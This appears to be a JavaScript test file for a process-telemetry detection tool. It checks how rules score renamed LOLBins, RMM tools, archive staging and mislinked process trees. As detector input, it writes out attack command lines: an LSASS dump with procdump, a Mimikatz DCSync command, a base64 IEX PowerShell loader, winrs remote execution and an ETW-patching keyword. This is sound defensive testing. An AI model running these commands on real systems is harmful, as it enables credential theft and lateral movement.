test("Process Inspector trust rules flag renamed LOLBins by OriginalFileName", () => {
  const node = mkNode({
    processName: "updater.exe",
    image: "C:\\Users\\Public\\updater.exe",
    originalFileName: "powershell.exe",
  });
  const det = getSusInfo(node, null);
  assert.equal(det.level, 3);
  assert.equal(det.reason, "Renamed LOLBin (OriginalFileName mismatch)");
  assert.ok(hasRule(det, "pi-34"));
});

test("Process Inspector trust scoring does not alert on missing trust metadata alone", () => {
  const node = mkNode({
    processName: "notepad.exe",
    image: "C:\\Windows\\System32\\notepad.exe",
    originalFileName: "",
    signed: "",
    signatureStatus: "",
    signer: "",
    hashes: "",
  });
  const det = getSusInfo(node, null);
  assert.equal(det.level, 0);
  const detMap = buildDetectionMap({ processes: [mkProc("missing-trust", node)] });
  assert.equal(detMap.get("missing-trust").level, 0);
  assert.equal(detMap.get("missing-trust").trust, undefined);
});

// Regression guard for the buildLifetimeAnalysis window-skip fix (release review L8).
// The old `i = Math.max(i, window.length - 2)` skip treated a COUNT as an absolute index.
// Removing it keeps the per-element scan so every member of a large short-respawn cluster
// that spans many overlapping windows is still flagged (the result Map dedups by key).
test("Process Inspector lifetime flags every member of a large short-respawn group (no dropped members)", () => {
  const base = Date.parse("2026-03-15T10:00:00Z");
  const N = 200; // 30s cadence over ~100min — far beyond the 10-min respawn window
  const processes = Array.from({ length: N }, (_, i) =>
    mkProc(`bigrespawn-${i}`, {
      processName: "dropper.exe",
      image: "C:\\Users\\victim\\AppData\\Local\\Temp\\dropper.exe",
      ts: new Date(base + i * 30000).toISOString(),
      tsMs: base + i * 30000,
      durationMs: 800, // short-lived (<5s) so every member is a short-respawn candidate
    }),
  );
  const lifeMap = buildLifetimeAnalysis({ processes });
  let flagged = 0;
  for (let i = 0; i < N; i++) {
    if (lifeMap.get(`bigrespawn-${i}`)?.type === "short-respawn") flagged++;
  }
  assert.equal(flagged, N, `all ${N} members should be flagged short-respawn; got ${flagged}`);
});

// ---------- FP batch 2: rule recalibration ----------

test("pi-9: winrm needs a remote-exec verb; bare 'winrm' substring is not a finding", () => {
  // Old /winrm/i matched any substring → FP on logs/paths/messages mentioning winrm.
  const noise = getSusInfo(mkNode({ processName: "cmd.exe", cmdLine: "echo connecting to winrm endpoint" }), null);
  assert.equal(hasRule(noise, "pi-9"), false, "bare 'winrm' with no verb must not fire");
  // winrs (remote shell) is real lateral movement — and the old regex never caught it.
  const winrs = getSusInfo(mkNode({ processName: "winrs.exe", cmdLine: "winrs -r:DC01 cmd.exe /c whoami" }), null);
  assert.ok(hasRule(winrs, "pi-9"), "winrs remote shell must be flagged");
  assert.equal(ruleCat(winrs, "pi-9"), "context");
});

test("pi-38: short-lived process is corroborating context, not an auto-HIGH", () => {
  // Previously: <2s from a user-writable path → override 2 (HIGH) with no corroboration.
  const tool = getSusInfo(mkNode({ processName: "randomtool.exe", image: "c:\\users\\a\\appdata\\local\\temp\\randomtool.exe", durationMs: 500 }), null);
  assert.ok(hasRule(tool, "pi-38"), "still records the brief lifetime");
  assert.equal(ruleCat(tool, "pi-38"), "context", "short lifetime alone is context, not primary");
  assert.equal(ruleLevel(tool, "pi-38"), 0, "no longer auto-promotes to HIGH");
  // Installers/updaters (SAFE_PROCS) legitimately exit in <2s → no finding at all.
  const setup = getSusInfo(mkNode({ processName: "setup.exe", image: "c:\\users\\a\\appdata\\local\\temp\\setup.exe", durationMs: 800 }), null);
  assert.equal(hasRule(setup, "pi-38"), false, "installer exiting quickly is not suspicious");
});

test("pi-44: bare scrcons is context; mofcomp loading a .mof stays HIGH", () => {
  const scrcons = getSusInfo(mkNode({ processName: "scrcons.exe", image: "c:\\windows\\system32\\wbem\\scrcons.exe" }), null);
  assert.ok(hasRule(scrcons, "pi-44"), "scrcons still surfaced");
  assert.equal(ruleCat(scrcons, "pi-44"), "context", "legit WMI consumer hosts also spawn scrcons");
  const mof = getSusInfo(mkNode({ processName: "mofcomp.exe", cmdLine: "mofcomp.exe C:\\evil\\backdoor.mof" }), null);
  assert.equal(ruleLevel(mof, "pi-44"), 2, "installing a WMI subscription via .mof stays HIGH");
});

test("pi-29: procdump→lsass is context under config-mgmt parents but HIGH under remote-access RMM", () => {
  const cmd = "procdump.exe -ma lsass.exe C:\\temp\\out.dmp";
  const sccm = getSusInfo(mkNode({ processName: "procdump.exe", cmdLine: cmd }), { processName: "ccmexec.exe" });
  assert.equal(ruleCat(sccm, "pi-29"), "context", "SCCM-deployed procdump diagnostics downgraded");
  const rmm = getSusInfo(mkNode({ processName: "procdump.exe", cmdLine: cmd }), { processName: "screenconnect.clientservice.exe" });
  assert.equal(ruleLevel(rmm, "pi-29"), 3, "LSASS dump under remote-access RMM is hands-on-keyboard theft");
});

test("pi-19: weak PS semantics under a mgmt parent surface as context, not a silent drop", () => {
  // iex + FromBase64String (score 2) under SCCM was previously dropped entirely (FN).
  const cmd = "powershell IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))";
  const r = getSusInfo(mkNode({ processName: "powershell.exe", cmdLine: cmd }), { processName: "ccmexec.exe" });
  assert.ok(hasRule(r, "pi-19"), "must not be silently dropped");
  assert.equal(ruleCat(r, "pi-19"), "context", "recorded as visible context under a mgmt parent");
});

test("detection coverage: potato privesc, dcsync, and ETW/AMSI-patch keywords are detected", () => {
  // pi-33 token theft — potato family.
  const potato = getSusInfo(mkNode({ processName: "godpotato.exe", image: "c:\\users\\a\\appdata\\local\\temp\\godpotato.exe" }), null);
  assert.ok(hasRule(potato, "pi-33"), "GodPotato must be flagged as token theft");
  // pi-4 credential dumping — DCSync.
  const dcsync = getSusInfo(mkNode({ processName: "mimi.exe", cmdLine: 'lsadump::dcsync /domain:corp /user:krbtgt' }), null);
  assert.ok(hasRule(dcsync, "pi-4"), "DCSync command must be flagged");
  // pi-19 — ETW patching keyword (override 3, critical).
  const etw = getSusInfo(mkNode({ processName: "powershell.exe", cmdLine: "[Ref].Assembly...; EtwEventWrite patched" }), null);
  assert.equal(ruleLevel(etw, "pi-19"), 3, "ETW patching is a critical AMSI/ETW tamper signal");
});

test("pi-39: no-termination only fires when the dataset records terminations somewhere", () => {
  const tool = mkNode({ processName: "handlekatz.exe" }); // LSASS tool, durationMs defaults NaN
  // Standalone / dataset that has termination data → missing terminate is meaningful.
  assert.ok(hasRule(getSusInfo(tool, null), "pi-39"), "fires when terminations exist elsewhere");
  // Dataset with NO termination records at all → missing terminate is just a logging gap.
  assert.equal(hasRule(getSusInfo(tool, null, { datasetHasTermination: false }), "pi-39"), false,
    "suppressed when the source carries no terminate events at all");
});

// ---------- FP batch 3: pi-12 / pi-14 / pi-17 / pi-57 recalibration ----------

test("pi-14: plain archive creation is benign; only a password flag stages exfil", () => {
  // Everyday backup/packaging — 'create archive' verb without a password must NOT fire.
  const backup = getSusInfo(mkNode({ processName: "7z.exe", cmdLine: "7z a C:\\backups\\nightly.7z C:\\data" }), null);
  assert.equal(hasRule(backup, "pi-14"), false, "plain 7z create is everyday backup noise");
  const winrar = getSusInfo(mkNode({ processName: "winrar.exe", cmdLine: "winrar a reports.rar C:\\reports" }), null);
  assert.equal(hasRule(winrar, "pi-14"), false, "plain winrar create must not fire");
  // Password-protected archive = encrypted staging — still flagged (context).
  const enc = getSusInfo(mkNode({ processName: "7z.exe", cmdLine: "7z a out.7z -pSECRET C:\\data" }), null);
  assert.ok(hasRule(enc, "pi-14"), "password-protected archive is exfil-staging");
  const hp = getSusInfo(mkNode({ processName: "rar.exe", cmdLine: "rar a -hpHUNTER2 stage.rar C:\\docs" }), null);
  assert.ok(hasRule(hp, "pi-14"), "rar -hp (header-encrypt password) is exfil-staging");
});

test("pi-12: service-installed RMM is context; shell-launched RMM is HIGH", () => {
  // MSP deployment: agent runs as a service → parent services.exe. Common & benign.
  const svc = getSusInfo(mkNode({ processName: "screenconnect.exe", image: "C:\\Program Files (x86)\\ScreenConnect\\screenconnect.exe" }), { processName: "services.exe" });
  assert.equal(ruleCat(svc, "pi-12"), "context", "service-installed RMM downgraded to context");
  // Threat-actor pattern: RMM spawned from a shell → genuinely suspicious.
  const shell = getSusInfo(mkNode({ processName: "anydesk.exe", image: "C:\\Users\\v\\AppData\\Local\\Temp\\anydesk.exe" }), { processName: "cmd.exe" });
  assert.ok(hasRule(shell, "pi-12"), "shell-launched RMM must fire");
  assert.equal(ruleCat(shell, "pi-12") === "context", false, "shell-launched RMM is not merely context");
});

test("pi-17 (RMM present — normal parent) is removed: no inventory-noise finding", () => {
  // Previously fired on every endpoint that merely HAS an RMM tool. Now: RMM under the
  // normal explorer parent in Program Files produces no pi-17 finding at all.
  const normal = getSusInfo(mkNode({ processName: "teamviewer.exe", image: "C:\\Program Files\\TeamViewer\\teamviewer.exe" }), { processName: "explorer.exe" });
  assert.equal(hasRule(normal, "pi-17"), false, "pi-17 no longer exists");
});

test("pi-57: same-named binary from a legit per-user install dir is not a dropper", () => {
  // Squirrel/Electron auto-update layout: \AppData\Local\<Vendor>\app-<ver>\ — benign.
  const procs = [
    mkProc("pf-1", { processName: "updater.exe", image: "C:\\Program Files\\Vendor\\updater.exe" }),
    mkProc("pf-2", { processName: "updater.exe", image: "C:\\Program Files\\Vendor\\updater.exe" }),
    mkProc("peruser", { processName: "updater.exe", image: "C:\\Users\\v\\AppData\\Local\\Slack\\app-4.0.0\\updater.exe" }),
  ];
  const det = buildDetectionMap({ processes: procs }).get("peruser");
  assert.ok(!det || det.trust?.type !== "same-name-unusual-path", "legit per-user app dir must not flag as unusual path");
  // But a genuinely odd staging path (Temp) for the same name STILL flags.
  const procs2 = [
    mkProc("pf-3", { processName: "svc.exe", image: "C:\\Program Files\\App\\svc.exe" }),
    mkProc("pf-4", { processName: "svc.exe", image: "C:\\Program Files\\App\\svc.exe" }),
    mkProc("temp", { processName: "svc.exe", image: "C:\\Users\\v\\AppData\\Local\\Temp\\svc.exe" }),
  ];
  const det2 = buildDetectionMap({ processes: procs2 }).get("temp");
  assert.equal(det2.trust?.type, "same-name-unusual-path", "Temp staging path still flagged");
});

// ---------- Investigation Story: root attribution must not climb mislinked edges ----------

test("incident story: a PID-reuse mislinked apex does not capture an unrelated subtree's story", () => {
  // Real-world bug: a selected skype.exe (chain cmd.exe → skype.exe) was narrated as
  // rooted at cortex-xdr-payload.exe — an unrelated rare process sitting at the tree apex
  // reached only through a PID-reuse mislink (wmiprvse declares svchost as parent but its
  // resolved parentKey points at cortex). rootKeyOf must stop at the inconsistent hop.
  const H = "WKS2390";
  const procs = [
    { key: "k-cortex", processName: "cortex-xdr-payload.exe", image: "C:\\ProgramData\\cortex-xdr-payload.exe", parentKey: null, parentProcessName: "", ts: "2025-04-22 02:01:00", user: "NT AUTHORITY\\SYSTEM", hostname: H },
    { key: "k-wmi", processName: "wmiprvse.exe", image: "C:\\Windows\\System32\\wbem\\wmiprvse.exe", parentKey: "k-cortex", parentProcessName: "svchost.exe", ts: "2025-04-22 02:05:00", user: "NT AUTHORITY\\SYSTEM", hostname: H },
    { key: "k-cmd", processName: "cmd.exe", image: "C:\\Windows\\System32\\cmd.exe", parentKey: "k-wmi", parentProcessName: "wmiprvse.exe", cmdLine: "cmd.exe /c start /min C:\\Users\\Public\\skype.exe", ts: "2025-04-22 02:06:00", user: "NT AUTHORITY\\SYSTEM", hostname: H },
    { key: "k-skype", processName: "skype.exe", image: "C:\\Users\\Public\\skype.exe", parentKey: "k-cmd", parentProcessName: "cmd.exe", cmdLine: "C:\\Users\\Public\\skype.exe", ts: "2025-04-22 02:06:30", user: "NT AUTHORITY\\SYSTEM", hostname: H },
  ];
  const byKey = new Map(procs.map((p) => [p.key, p]));
  const childMap = new Map();
  for (const p of procs) { if (p.parentKey) { if (!childMap.has(p.parentKey)) childMap.set(p.parentKey, []); childMap.get(p.parentKey).push(p.key); } }
  // Only the apex and the leaf are "suspicious" — cmd/wmi are benign carriers.
  const detMap = new Map([
    ["k-cortex", { level: 2, reason: "Rare process from unusual path", triageScore: 300, techniques: ["T1036.005"] }],
    ["k-skype", { level: 2, reason: "Same process name from unusual path", triageScore: 253, techniques: ["T1204", "T1036.005"] }],
  ]);

  const stories = buildIncidentStories({ processes: procs }, byKey, childMap, detMap, new Map(), new Map());

  // skype must get its OWN story (anchored on itself), not be absorbed into cortex's.
  const skypeStory = stories.find((s) => s.anchorKey === "k-skype");
  assert.ok(skypeStory, "skype.exe must form its own incident, not merge into the mislinked apex");
  assert.ok(!/cortex-xdr-payload/i.test(skypeStory.title), `story title must not name the mislinked apex (got: ${skypeStory.title})`);
  assert.ok(!/cortex-xdr-payload/i.test(skypeStory.narrative), `story narrative must not name the mislinked apex (got: ${skypeStory.narrative})`);
  // The two suspicious events are distinct incidents — not one inflated 2-event story.
  assert.equal(stories.length, 2, "mislinked apex and leaf must be separate incidents");
  assert.equal(skypeStory.eventCount, 1, "skype's incident must not absorb the apex's events");
  // The apex keeps its own separate story with its own (single) event.
  const cortexStory = stories.find((s) => s.anchorKey === "k-cortex");
  assert.ok(cortexStory && cortexStory.eventCount === 1, "the mislinked apex is its own 1-event incident");
});

test("consistentParentKey: shared ancestry-walk guard (used by story root + all UI walks)", () => {
  const byKey = new Map([
    ["root", { key: "root", processName: "cortex-xdr-payload.exe", parentKey: null, parentProcessName: "" }],
    ["wmi", { key: "wmi", processName: "wmiprvse.exe", parentKey: "root", parentProcessName: "svchost.exe" }],   // MISLINK: declares svchost, parent is cortex
    ["cmd", { key: "cmd", processName: "cmd.exe", parentKey: "wmi", parentProcessName: "wmiprvse.exe" }],         // consistent
    ["sec", { key: "sec", processName: "cmd.exe", parentKey: "wmi", parentProcessName: "" }],                    // missing declared name → falls through
    ["orphan", { key: "orphan", processName: "x.exe", parentKey: "missing", parentProcessName: "y.exe" }],       // unresolved parent → returns raw pk
  ]);
  // Consistent edge → returns the parentKey.
  assert.equal(consistentParentKey(byKey.get("cmd"), byKey), "wmi");
  // Mislinked edge (declared ≠ actual) → null, so the walk stops here.
  assert.equal(consistentParentKey(byKey.get("wmi"), byKey), null);
  // Missing declared parent name → can't judge, falls through to the raw parentKey.
  assert.equal(consistentParentKey(byKey.get("sec"), byKey), "wmi");
  // No parentKey (a root) → null.
  assert.equal(consistentParentKey(byKey.get("root"), byKey), null);
  // Unresolved parent node → returns the raw key (caller's byKey.has guard terminates).
  assert.equal(consistentParentKey(byKey.get("orphan"), byKey), "missing");
  // Null/undefined node → null (no throw).
  assert.equal(consistentParentKey(null, byKey), null);
});

// ── P1: grandparent multi-hop, multi-field custom, adjacent telemetry rules ──

test("pi-60: winword → cmd → powershell fires grandparent multi-hop chain", () => {
  const leaf = mkNode({
    processName: "powershell.exe",
    cmdLine: "powershell -nop -c whoami",
    image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  });
  const parent = mkNode({
    processName: "cmd.exe",
    image: "C:\\Windows\\System32\\cmd.exe",
  });
  const gp = mkNode({
    processName: "WINWORD.EXE",
    image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
  });
  const det = getSusInfo(leaf, parent, { grandparentNode: gp });
  assert.ok(det.level >= 2, `expected multi-hop severity, got ${det.level} (${det.reason})`);
  assert.ok(
    (det.evidence || []).some((e) => e.ruleId === "pi-60"),
    `expected pi-60 evidence, got ${JSON.stringify((det.evidence || []).map((e) => e.ruleId))}`,
  );
});

test("multi-field custom rule matches parent + process without regex", () => {
  const leaf = mkNode({
    processName: "powershell.exe",
    cmdLine: "powershell -enc AAAA",
    image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  });
  const parent = mkNode({
    processName: "winword.exe",
    image: "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
  });
  const customRules = [{
    name: "My Office PS",
    parentProcess: "winword",
    processName: "powershell",
    severity: "critical",
    behavior: "script-exec",
    technique: "T1059.001",
    category: "Custom",
    _rx: null,
  }];
  const det = getSusInfo(leaf, parent, { customRules });
  assert.ok(
    (det.evidence || []).some((e) => String(e.ruleId || "").startsWith("custom")),
    `expected custom rule hit, got ${JSON.stringify(det.evidence)}`,
  );
  assert.ok((det.behaviors || []).includes("script-exec"));
});

test("pi-61: outbound network with rare destinations from process", () => {
  const leaf = mkNode({
    processName: "powershell.exe",
    cmdLine: "powershell",
    image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    networkActivity: {
      eventCount: 5,
      destCount: 3,
      rareDestCount: 2,
      destinations: ["1.2.3.4", "5.6.7.8"],
      samples: [],
    },
  });
  const det = getSusInfo(leaf, null, {});
  assert.ok(
    (det.evidence || []).some((e) => e.ruleId === "pi-61"),
    `expected pi-61, got ${det.reason} ${JSON.stringify((det.evidence || []).map((e) => e.ruleId))}`,
  );
});

test("pi-64: PE drop in writable path from EID 11 enrichment", () => {
  const leaf = mkNode({
    processName: "chrome.exe",
    cmdLine: "chrome.exe",
    image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    fileCreates: {
      eventCount: 2,
      peCount: 1,
      scriptCount: 0,
      writablePathCount: 1,
      samples: [{ path: "C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe" }],
    },
  });
  const det = getSusInfo(leaf, null, {});
  assert.ok(
    (det.evidence || []).some((e) => e.ruleId === "pi-64"),
    `expected pi-64, got ${JSON.stringify((det.evidence || []).map((e) => e.ruleId))}`,
  );
});
